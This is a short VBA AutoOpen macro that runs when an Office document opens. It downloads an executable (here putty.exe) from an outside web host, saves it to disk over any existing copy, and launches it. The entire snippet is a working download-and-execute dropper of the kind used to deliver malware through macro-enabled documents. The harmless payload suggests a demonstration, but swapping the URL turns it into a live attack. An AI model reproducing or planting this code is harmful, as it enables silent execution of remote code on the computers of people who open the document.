' AutoOpen Macro
Sub AutoOpen()

Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe", False
xHttp.Send

With bStrm
    .Type = 1 '//binary
    .Open
    .write xHttp.responseBody
    .savetofile "putty.exe", 2 '//overwrite
End With

Shell ("putty.exe")

End Sub